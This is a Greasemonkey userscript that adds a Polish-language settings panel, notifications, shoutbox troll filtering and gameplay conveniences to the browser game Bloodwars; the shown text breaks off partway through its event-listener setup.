// ==UserScript==
// @name        UnMod
// @namespace   http://mega.szajb.us/juenizer/unmod/
// @description Advanced Bloodwars MODIFICATIONS
// @include     http://r*.bloodwars.interia.pl/*
// @include     http://r*.bloodwars.net/*
// @include 		http://r*.bloodwars.pl/*
// @include     https://r*.bloodwars.interia.pl/*
// @include     https://r*.bloodwars.net/*
// @include 		https://r*.bloodwars.pl/*
// @include     http://beta.bloodwars.net/*
// @include     https://beta.bloodwars.net/*
// @require     https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_deleteValue
// @grant       GM_listValues
// @grant       GM_addStyle
// @version 201802100
// ==/UserScript==
var UM_VER = '201802100';
// made by juen @ cdlabel . info
// zapraszam: http://nakoz.org, http://szajb.us, http://cdlabel.info
//
var conowego = 'Co nowego?\n\n\
201810020: maxowanie skory bestii, oddaj zk fix, wykrywanie zabranej krwi fix\n\
201710110: szybkie klanowki\n\
201709100: https dla readera shoutboxa\n\
201708070: fix https bw\n\
';
var hajs;
function UNMOD() {
  if (document.getElementsByClassName('komunikat').length) {
    if (document.getElementsByTagName('body') [0].innerHTML.search('anking') > 0) {
      setTimeout(function () {
        location.reload()
      }, 3000);
      return;
    }
  }
  var a = location.search;
  var id = location.host.split('.') [0];
  if (location.host.split('.') [2] == 'net') {
    id = id + 'en';
  }
  var css = document.createElement('style');
  css.type = 'text/css';
  css.innerHTML = '.blink {      animation: blink 1s steps(5, start) infinite;      -webkit-animation: blink 1s steps(5, start) infinite;    }    @keyframes blink {      to {        visibility: hidden;      }    }    @-webkit-keyframes blink {      to {        visibility: hidden;      }    }';
  document.body.appendChild(css);
  function notification(msg) {
    if (GM_getValue(id + 'UM_OP_notify', true)) {
      if (!('Notification' in window)) {
        return;
      }
      else if (Notification.permission === 'granted') {
        var notification = new Notification('UnMod (' + id + '):', {
          body: msg
        });
      }
      else if (Notification.permission !== 'denied') {
        Notification.requestPermission(function (permission) {
          if (!('permission' in Notification)) {
            Notification.permission = permission;
          }
          if (permission === 'granted') {
            var notification = new Notification('UnMod (' + id + '):', {
              body: msg
            });
          }
        });
      }
    }
  }
  var scriptCode = new Array(); // this is where we are going to build our new script
  scriptCode.push('var conowego = "' + conowego.split('\n').join('^') + '";');
  scriptCode.push('function notification(msg) {');
  if (GM_getValue(id + 'UM_OP_notify', true)) {
    scriptCode.push('if (!(\'Notification\' in window)) {      return;  }  else if (Notification.permission === \'granted\') {    var notification = new Notification(\'UnMod (' + id + '):\', {body: msg});  }  else {    Notification.requestPermission(function (permission) {      if(!(\'permission\' in Notification)) {        Notification.permission = permission;      }      if (permission === \'granted\') {        var notification = new Notification(\'UnMod (' + id + '):\', {body: msg});      }});  }');
  }
  scriptCode.push('}');
  var script = document.createElement('script'); // create the script element
  script.innerHTML = scriptCode.join('\n'); // add the script code to it
  scriptCode.length = 0; // recover the memory we used to build the script
  document.getElementsByTagName('head') [0].appendChild(script);
  function addevent_rem2(item_id) {
    document.getElementById('uz_' + item_id).addEventListener('click', function () {
      GM_deleteValue(id + 'UM_UZ_' + item_id);
      window.location.reload();
    }, false);
  }
  function addevent_add(item_id, item_name) {
    document.getElementById('UM_UZ_' + item_id).addEventListener('click', function () {
      GM_setValue(id + 'UM_UZ_' + item_id, item_name);
      window.location.reload();
    }, false);
  }
  function addevent_rem(item_id, item_name) {
    document.getElementById('UM_UZ_' + item_id).addEventListener('click', function () {
      GM_deleteValue(id + 'UM_UZ_' + item_id);
      window.location.reload();
    }, false);
  }
  var scriptCode = new Array(); // this is where we are going to build our new script
  scriptCode.push('function onSboxRead(type,msg){');
  scriptCode.push('var msghtml= document.createElement(\'span\'); msghtml.innerHTML= msg; ');
  scriptCode.push('li = msghtml.getElementsByTagName("LI"); for (t = 0; t < li.length; t++) {\ttest = li[t].getElementsByTagName("a")[0].href;\tuid = test.substring(test.indexOf("&")+5,test.indexOf("&")+10);\ttrole = "' + GM_getValue(id + 'UM_trole', '') + '"; trole=trole.split(" ");\tfor (x = 0; x<trole.length;x++) if (uid==parseInt(trole[x])) li[t].style.display="none";}');
  scriptCode.push('$$(\'sbox_\'+type+\'_container\').innerHTML += msghtml.innerHTML;');
  scriptCode.push('scrollSbox(type);');
  scriptCode.push('return true;\t');
  scriptCode.push('}');
  var script = document.createElement('script'); // create the script element
  script.innerHTML = scriptCode.join('\n'); // add the script code to it
  scriptCode.length = 0; // recover the memory we used to build the script
  document.getElementsByTagName('head') [0].appendChild(script);
  if (a == '?a=settings') {
    div = document.getElementsByClassName('hr720') [0];
    opcje = '<br /><br /><span style="color: #fff; text-shadow: 0px -1px 4px white, 0px -2px 10px yellow, 0px -10px 20px #ff8000, 0px -18px 40px red; font: 28px \'BlackJackRegular\'";><b>UnMod</b> ver: ' + UM_VER + ' - <i>simply made by JUEN/gg:1008732</i></span><br><b>Autor robi to za FRAJER, ale powaznie ucieszy sie obdarowaniem kodem premium jako wyraz wdziecznosci ;)</b><BR>';
    opcje += '<iframe scrolling=no src="http://mega.szajb.us/juenizer/unmod/ver.php?ver=' + UM_VER + '" width="90%" style="margin-top: 3px; box-shadow: 10px 10px 5px #888888; border-radius: 20px; " frameborder=0 \t height="33"></iframe><BR><BR>';
    opcje += '<center><table width="90%" style="text-align: left; margin-top: 5px; font-family: \'Lucida Grande\', \'Lucida Sans Unicode\', Helvetica, Arial;">';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_unmodon', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_unmodon"> unmod aktywny (można go wyłączyć dla tego konkretnego serwera)</td></tr>';
          /* czapka */
    opcje += '<tr><td><input type="checkbox"';
		if (GM_getValue(id + 'UM_OP_questItemListOn', true)) opcje += ' checked="checked"';
		opcje += ' id="UM_OP_questItemListOn"> pokazywanie tylko podsumowania z wypraw/karawan (by Czapka)</td></tr>';
		opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_noexp', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_noexp"> zaznaczaj rezygnacje z doswiadczenia przy exp</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark15', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark15"> załączaj grozę</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark6', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark6"> maxuj zwinke</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark13', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark13"> maxuj sposta</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark4', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark4"> maxuj skore bestii</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark3', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark3"> maxuj sile</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark7', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark7"> maxuj cisze krwi</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark8', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark8"> maxuj wyssanie mocy</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark5', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark5"> maxuj krew zycia</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark14', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark14"> maxuj tchnienie</td></tr>';

    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark1',  false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark1"> maxuj adonisa</td></tr>';

    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark2', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark2"> maxuj kaligule</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ark9', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ark9"> maxuj majestat</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_notify', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_notify"> wykorzystuj okno notyfikacji jeśli to możliwe</td></tr>';
    opcje += '<tr><td>';
    opcje += 'automatycznie wybierz jednoraz ';
    opcje += '<select id="UM_OP_jednoraz1">';
    opcje += '<option value="0" data-tier="0" >Brak</option>';
    opcje += '<option value="1" data-tier="1" >Krew wilka</option>';
    opcje += '<option value="2" data-tier="1" >Jabłko żelaznego drzewa</option>';
    opcje += '<option value="3" data-tier="1" >Płetwa rekina</option>';
    opcje += '<option value="4" data-tier="1" >Eliksir zmysłów</option>';
    opcje += '<option value="5" data-tier="1" >Święcona woda</option>';
    opcje += '<option value="6" data-tier="1" >Łza feniksa</option>';
    opcje += '<option value="7" data-tier="1" >Magiczna pieczęć</option>';
    opcje += '<option value="8" data-tier="1" >Serce nietoperza</option>';
    opcje += '<option value="9" data-tier="1" >Kwiat lotosu</option>';
    opcje += '<option value="10" data-tier="1" >Jad Wielkopchły</option>';
    opcje += '<option value="11" data-tier="1" >Serum oświecenia</option>';
    opcje += '<option value="12" data-tier="1" >Wywar z czarnego kota</option>';
    opcje += '<option value="13" data-tier="1" >Węgiel</option>';
    opcje += '<option value="14" data-tier="1" >Sierść kreta</option>';
    opcje += '<option value="15" data-tier="1" >Saletra</option>';
    opcje += '<option value="46" data-tier="1" >Sok z żuka</option>';
    opcje += '<option disabled="disabled" value=""> </option>';
    opcje += '<option value="16" data-tier="2" >Esencja młodości</option>';
    opcje += '<option value="17" data-tier="2" >Paznokieć trolla</option>';
    opcje += '<option value="18" data-tier="2" >Wilcza jagoda</option>';
    opcje += '<option value="19" data-tier="2" >Oko kota</option>';
    opcje += '<option value="20" data-tier="2" >Absynt</option>';
    opcje += '<option value="21" data-tier="2" >Łuski salamandry</option>';
    opcje += '<option value="22" data-tier="2" >Woda źródlana</option>';
    opcje += '<option value="23" data-tier="2" >Kość męczennika</option>';
    opcje += '<option value="24" data-tier="2" >Napój miłosny</option>';
    opcje += '<option value="25" data-tier="2" >Jad skorpiona</option>';
    opcje += '<option value="26" data-tier="2" >Korzeń mandragory</option>';
    opcje += '<option value="27" data-tier="2" >Gwiezdny pył</option>';
    opcje += '<option value="28" data-tier="2" >Fiolka kwasu</option>';
    opcje += '<option value="29" data-tier="2" >Siarka</option>';
    opcje += '<option value="30" data-tier="2" >Czarny diament</option>';
    opcje += '<option value="47" data-tier="2" >Oko topielca</option>';
    opcje += '<option disabled="disabled" value=""> </option>';
    opcje += '<option value="31" data-tier="3" >Boska łza</option>';
    opcje += '<option value="32" data-tier="3" >Ząb ghula</option>';
    opcje += '<option value="33" data-tier="3" >Wywar z koralowca</option>';
    opcje += '<option value="34" data-tier="3" >Serce proroka</option>';
    opcje += '<option value="35" data-tier="3" >Pazur bazyliszka</option>';
    opcje += '<option value="36" data-tier="3" >Łuski demona</option>';
    opcje += '<option value="37" data-tier="3" >Skrzydła chrząszcza</option>';
    opcje += '<option value="38" data-tier="3" >Maska gargulca</option>';
    opcje += '<option value="39" data-tier="3" >Sok z modliszki</option>';
    opcje += '<option value="40" data-tier="3" >Oddech smoka</option>';
    opcje += '<option value="41" data-tier="3" >Ząb wiedźmy</option>';
    opcje += '<option value="42" data-tier="3" >Grimoire</option>';
    opcje += '<option value="43" data-tier="3" >Czarna żółć</option>';
    opcje += '<option value="44" data-tier="3" >Palec kowala</option>';
    opcje += '<option value="45" data-tier="3" >Kwiat bzu</option>';
    opcje += '<option value="48" data-tier="3" >Ogień z serca ziemi</option>';
    opcje += '</select>';
    opcje += '</td></tr>';
    opcje += '<tr><td>';
    opcje += 'automatycznie wybierz jednoraz (jesli nie stac na powyzszy) ';
    opcje += '<select id="UM_OP_jednoraz2">';
    opcje += '<option value="0" data-tier="0" >Brak</option>';
    opcje += '<option value="1" data-tier="1" >Krew wilka</option>';
    opcje += '<option value="2" data-tier="1" >Jabłko żelaznego drzewa</option>';
    opcje += '<option value="3" data-tier="1" >Płetwa rekina</option>';
    opcje += '<option value="4" data-tier="1" >Eliksir zmysłów</option>';
    opcje += '<option value="5" data-tier="1" >Święcona woda</option>';
    opcje += '<option value="6" data-tier="1" >Łza feniksa</option>';
    opcje += '<option value="7" data-tier="1" >Magiczna pieczęć</option>';
    opcje += '<option value="8" data-tier="1" >Serce nietoperza</option>';
    opcje += '<option value="9" data-tier="1" >Kwiat lotosu</option>';
    opcje += '<option value="10" data-tier="1" >Jad Wielkopchły</option>';
    opcje += '<option value="11" data-tier="1" >Serum oświecenia</option>';
    opcje += '<option value="12" data-tier="1" >Wywar z czarnego kota</option>';
    opcje += '<option value="13" data-tier="1" >Węgiel</option>';
    opcje += '<option value="14" data-tier="1" >Sierść kreta</option>';
    opcje += '<option value="15" data-tier="1" >Saletra</option>';
    opcje += '<option value="46" data-tier="1" >Sok z żuka</option>';
    opcje += '<option disabled="disabled" value=""> </option>';
    opcje += '<option value="16" data-tier="2" >Esencja młodości</option>';
    opcje += '<option value="17" data-tier="2" >Paznokieć trolla</option>';
    opcje += '<option value="18" data-tier="2" >Wilcza jagoda</option>';
    opcje += '<option value="19" data-tier="2" >Oko kota</option>';
    opcje += '<option value="20" data-tier="2" >Absynt</option>';
    opcje += '<option value="21" data-tier="2" >Łuski salamandry</option>';
    opcje += '<option value="22" data-tier="2" >Woda źródlana</option>';
    opcje += '<option value="23" data-tier="2" >Kość męczennika</option>';
    opcje += '<option value="24" data-tier="2" >Napój miłosny</option>';
    opcje += '<option value="25" data-tier="2" >Jad skorpiona</option>';
    opcje += '<option value="26" data-tier="2" >Korzeń mandragory</option>';
    opcje += '<option value="27" data-tier="2" >Gwiezdny pył</option>';
    opcje += '<option value="28" data-tier="2" >Fiolka kwasu</option>';
    opcje += '<option value="29" data-tier="2" >Siarka</option>';
    opcje += '<option value="30" data-tier="2" >Czarny diament</option>';
    opcje += '<option value="47" data-tier="2" >Oko topielca</option>';
    opcje += '<option disabled="disabled" value=""> </option>';
    opcje += '<option value="31" data-tier="3" >Boska łza</option>';
    opcje += '<option value="32" data-tier="3" >Ząb ghula</option>';
    opcje += '<option value="33" data-tier="3" >Wywar z koralowca</option>';
    opcje += '<option value="34" data-tier="3" >Serce proroka</option>';
    opcje += '<option value="35" data-tier="3" >Pazur bazyliszka</option>';
    opcje += '<option value="36" data-tier="3" >Łuski demona</option>';
    opcje += '<option value="37" data-tier="3" >Skrzydła chrząszcza</option>';
    opcje += '<option value="38" data-tier="3" >Maska gargulca</option>';
    opcje += '<option value="39" data-tier="3" >Sok z modliszki</option>';
    opcje += '<option value="40" data-tier="3" >Oddech smoka</option>';
    opcje += '<option value="41" data-tier="3" >Ząb wiedźmy</option>';
    opcje += '<option value="42" data-tier="3" >Grimoire</option>';
    opcje += '<option value="43" data-tier="3" >Czarna żółć</option>';
    opcje += '<option value="44" data-tier="3" >Palec kowala</option>';
    opcje += '<option value="45" data-tier="3" >Kwiat bzu</option>';
    opcje += '<option value="48" data-tier="3" >Ogień z serca ziemi</option>';
    opcje += '</select>';
    opcje += '</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_epickie', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_epickie"> podświetlaj epickie przedmioty w zbrojowni <input type="text" id="UM_kolorepik" value="' + GM_getValue(id + 'UM_kolorepik', 'blue') + '"></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_legendarne', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_legendarne"> podświetlaj legendarne przedmioty w zbrojowni <input type="text" id="UM_kolorlegenda" value="' + GM_getValue(id + 'UM_kolorlegenda', 'green') + '"></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_mysort', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_mysort"> sortuj stronę rankingu, na której się znajduję wg. dostępności ataku</td></tr>';
    opcje += '<tr><td><input type="checkbox"';



    if (GM_getValue(id + 'UM_OP_shop1', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_shop1"> wyświetlaj od razu informacje o właściwościach jednorazów</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ukryj', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ukryj"> ukrywaj publiczny opis klanu, w którym się znajdujesz</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_ukryj2', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_ukryj2"> ukrywaj prywatny opis klanu, w którym się znajdujesz</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_youtube', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_youtube"> zamieniaj linki youtube w shoutboxie na playera oraz wyswietlaj obrazki</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_mysort1', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_mysort1"> sortuj pierwszą stronę rankingu wg. dostępności ataku</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_mysort2', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_mysort2"> sortuj drugą stronę rankingu wg. dostępności ataku</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_mysort3', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_mysort3"> sortuj wszystkie strony rankingu</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_taximax', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_taximax"> auto taxi max <select id="UM_OP_taxilev">';
    for (i = 1; i <= 5; i++) {
      if (GM_getValue(id + 'UM_OP_taxilev', 5) == i) {
        opcje += '<option selected value' + i + '>' + i + '</option>';
      } else {
        opcje += '<option value' + i + '>' + i + '</option>';
      }
    }
    opcje += '</select></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_fastzk', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_fastzk"> szybkie klikanie przedmiotów w zbrojowni</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_wyparch', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_wyparch"> anonimowe zbieranie statystyk z wypraw - <a target="_new" href="http://mega.szajb.us/juenizer/unmod/">http://mega.szajb.us/juenizer/unmod/</a></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_shoutboxclan', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_shoutboxclan"> automatycznie otwieraj okno chatu klanowego & przeźroczystość</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_linkluck', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_linkluck"> pokazuj odnośnik do zapisów na lucka w menu bw</td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_donesound', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_donesound"> odgrywaj dźwięk po zakończonej wyprawie/ataku/szpiegowaniu <input type="text" id="UM_urlsound" value="' + GM_getValue(id + 'UM_urlsound', 'http://soundimpress.pl/audio/download/103/soundimpress.pl_click_sfx_synth_a01.mp3') + '"></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_clansound', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_clansound"> odgrywaj dźwięk nowej wiadomości na sb klanowym <input type="text" id="UM_urlclansound" value="' + GM_getValue(id + 'UM_urlclansound', 'http://www.sounds4email.com/wav/hex4.mp3') + '"></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_globalsound', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_globalsound"> odgrywaj dźwięk nowej wiadomości na sb globalnym <input type="text" id="UM_urlglobalsound" value="' + GM_getValue(id + 'UM_urlglobalsound', 'http://www.sounds4email.com/wav/hex4.mp3') + '"></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_zkkrew', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_zkkrew"> wyszczególniaj przedmioty do krwi w zbrojowni</td></tr>';
    opcje += '<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
    opcje += '(po kliknięciu CZYŚĆ obok SPRZEDAJ) czyszczenie najniższej półki do (PLN): <input type="text" id="UM_zkclean" value="' + GM_getValue(id + 'UM_zkclean', '2000') + '"></td></tr>';
    opcje += '<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
    opcje += 'BLOKUJ TROLI NA SB (podaj id, lub parę oddzielając spacjami): <input type="text" id="UM_trole" value="' + GM_getValue(id + 'UM_trole', '') + '"></td></tr>';


    opcje += '<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
    opcje += 'DEBUG (zostaw puste do prawidlowego dzialania!): <input type="text" id="UM_pass" value="' + GM_getValue(id + 'UM_pass', '') + '"></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_spiszk', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_spiszk"> numer zbrojowni klanowej wygenerowany przez https://zk.nakoz.org: <input type="text" id="UM_zk" value="' + GM_getValue(id + 'UM_zk', '') + '"></td></tr>';
    opcje += '<tr><td><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_alarm', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_alarm"> alarm o godzinie: ';
    opcje += '<select id="UM_OP_alarm_h"><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="0">0</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option></select>';
    opcje += '&nbsp;:&nbsp;<select id="UM_OP_alarm_m">';
    for (i = 0; i < 60; i++) {
      if (i < 10) i2 = '0' + i;
       else i2 = i;
      opcje += '<option value="' + i + '">' + i2 + '</option>';
    }
    opcje += '</select> (by alarm się uruchomił musisz mieć zostawioną otwartą stronę z bw)';
    opcje += '</td></tr>';
    opcje += '<tr><td style="text-align: left;">';
    opcje += '<tr><td><br><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_polki', false)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_polki"> ';
    opcje += 'własne nazwy półek: <br><br>';
    opcje += '10:<input type="text" style="width: 100px;" id="UM_OP_polka10" value="' + GM_getValue(id + 'UM_OP_polka10', 'Półka 10') + '">';
    opcje += '&nbsp;9: <input type="text" style="width: 100px;" id="UM_OP_polka9" value="' + GM_getValue(id + 'UM_OP_polka9', 'Półka 9') + '">';
    opcje += '&nbsp;8: <input type="text" style="width: 100px;" id="UM_OP_polka8" value="' + GM_getValue(id + 'UM_OP_polka8', 'Półka 8') + '">';
    opcje += '&nbsp;7: <input type="text" style="width: 100px;" id="UM_OP_polka7" value="' + GM_getValue(id + 'UM_OP_polka7', 'Półka 7') + '">';
    opcje += '&nbsp;6: <input type="text" style="width: 100px;" id="UM_OP_polka6" value="' + GM_getValue(id + 'UM_OP_polka6', 'Półka 6') + '">';
    opcje += '<br>&nbsp;5: <input type="text" style="width: 100px;" id="UM_OP_polka5" value="' + GM_getValue(id + 'UM_OP_polka5', 'Półka 5') + '">';
    opcje += '&nbsp;4: <input type="text" style="width: 100px;" id="UM_OP_polka4" value="' + GM_getValue(id + 'UM_OP_polka4', 'Półka 4') + '">';
    opcje += '&nbsp;3: <input type="text" style="width: 100px;" id="UM_OP_polka3" value="' + GM_getValue(id + 'UM_OP_polka3', 'Półka 3') + '">';
    opcje += '&nbsp;2: <input type="text" style="width: 100px;" id="UM_OP_polka2" value="' + GM_getValue(id + 'UM_OP_polka2', 'Półka 2') + '">';
    opcje += '&nbsp;1: <input type="text" style="width: 100px;" id="UM_OP_polka1" value="' + GM_getValue(id + 'UM_OP_polka1', 'Półka 1') + '">';
    opcje += '</td></tr>';
    opcje += '<tr><td style="text-align: left;">';
    opcje += '<tr><td><BR><input type="checkbox"';
    if (GM_getValue(id + 'UM_OP_skroty', true)) opcje += ' checked="checked"';
    opcje += ' id="UM_OP_skroty"> skróty klawiszowe - klawisz ALT oraz liczba:<br><br>';
    opcje += '&nbsp;1: <input type="text" style="width: 100px;" id="UM_OP_key_1" value="' + GM_getValue(id + 'UM_OP_key_1', 'msg') + '">';
    opcje += '&nbsp;2: <input type="text" style="width: 100px;" id="UM_OP_key_2" value="' + GM_getValue(id + 'UM_OP_key_2', 'aliance') + '">';
    opcje += '&nbsp;3: <input type="text" style="width: 100px;" id="UM_OP_key_3" value="' + GM_getValue(id + 'UM_OP_key_3', 'equip') + '">';
    opcje += '&nbsp;4: <input type="text" style="width: 100px;" id="UM_OP_key_4" value="' + GM_getValue(id + 'UM_OP_key_4', 'ambush') + '">';
    opcje += '&nbsp;5: <input type="text" style="width: 100px;" id="UM_OP_key_5" value="' + GM_getValue(id + 'UM_OP_key_5', 'quest') + '">';
    opcje += '<br>&nbsp;6: <input type="text" style="width: 100px;" id="UM_OP_key_6" value="' + GM_getValue(id + 'UM_OP_key_6', 'cevent') + '">';
    opcje += '&nbsp;7: <input type="text" style="width: 100px;" id="UM_OP_key_7" value="' + GM_getValue(id + 'UM_OP_key_7', 'swr') + '">';
    opcje += '&nbsp;8: <input type="text" style="width: 100px;" id="UM_OP_key_8" value="' + GM_getValue(id + 'UM_OP_key_8', 'rank') + '">';
    opcje += '&nbsp;9: <input type="text" style="width: 100px;" id="UM_OP_key_9" value="' + GM_getValue(id + 'UM_OP_key_9', 'townview') + '">';
    opcje += '&nbsp;0: <input type="text" style="width: 100px;" id="UM_OP_key_0" value="' + GM_getValue(id + 'UM_OP_key_0', 'auction') + '">';
    opcje += '</td></tr>';
    opcje += '<tr><td style=""><BR><b><center>Polecam!</center><BR><span style="">';
    opcje += '- pomysły i dyskusje o unmod: <a target="_new" href="http://forum.bloodwars.interia.pl/thread.php?threadid=1187656">http://forum.bloodwars.interia.pl/thread.php?threadid=1187656</a><br>';
    opcje += '- szybka zbrojownia dla całego klanu: <a target="_new" href="http://forum.bloodwars.interia.pl/thread.php?threadid=841787">http://forum.bloodwars.interia.pl/thread.php?threadid=841787</a><br>';
    opcje += '- generator sygnatur bw on-line: <a target="_new" href="http://forum.bloodwars.interia.pl/thread.php?threadid=949855">http://forum.bloodwars.interia.pl/thread.php?threadid=949855</a><br>';
    opcje += '- odstresuj się dobrym dropem: <a target="_new" href="http://forum.bloodwars.interia.pl/thread.php?threadid=926110">http://forum.bloodwars.interia.pl/thread.php?threadid=926110</a><br>';
    opcje += '- automatyczny ranking r12: <a target="_new" href="http://forum.bloodwars.interia.pl/thread.php?threadid=1068988">http://forum.bloodwars.interia.pl/thread.php?threadid=1068988</a><br>';
    opcje += '- wyciągnij spis budynków: <a target="_new" href="http://mega.szajb.us/juen/budynki.php">http://mega.szajb.us/juen/budynki.php</a>';
    opcje += '</span></td></tr>';
    opcje += '</table></center><BR><BR>';
    div.innerHTML += opcje;
    var scriptCode = new Array();
    if (GM_getValue(id + 'UM_OP_jednoraz1', 0)) {
      scriptCode.push('document.getElementById("UM_OP_jednoraz1").value=' + GM_getValue(id + 'UM_OP_jednoraz1', 0));
    }
    if (GM_getValue(id + 'UM_OP_jednoraz2', 0)) {
      scriptCode.push('document.getElementById("UM_OP_jednoraz2").value=' + GM_getValue(id + 'UM_OP_jednoraz2', 0));
    }
    var script = document.createElement('script');
    script.innerHTML = scriptCode.join('\n');
    scriptCode.length = 0;
    document.getElementsByTagName('head') [0].appendChild(script);
    wyb = GM_getValue(id + 'UM_OP_alarm_h', 0);
    if (parseInt(wyb) >= 12) wyb -= 12;
     else wyb = parseInt(wyb) + 12;
    document.getElementById('UM_OP_alarm_h').options[wyb].selected = true;
    wyb = GM_getValue(id + 'UM_OP_alarm_m', 0);
    document.getElementById('UM_OP_alarm_m').options[wyb].selected = true;
    document.getElementById('content-mid').style.minHeight = '2000px';
    document.getElementById('UM_OP_noexp').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_noexp', this.checked);
    }, false);
    document.getElementById('UM_OP_ark15').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark15', this.checked);
    }, false);
    document.getElementById('UM_OP_ark14').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark14', this.checked);
    }, false);
    document.getElementById('UM_OP_ark4').addEventListener('click', function () {
      GM_setValue(id + 'UM_OP_ark4', this.checked);
    }, false);
    document.getElementById('UM_OP_ark6').addEventListener('click', function () {
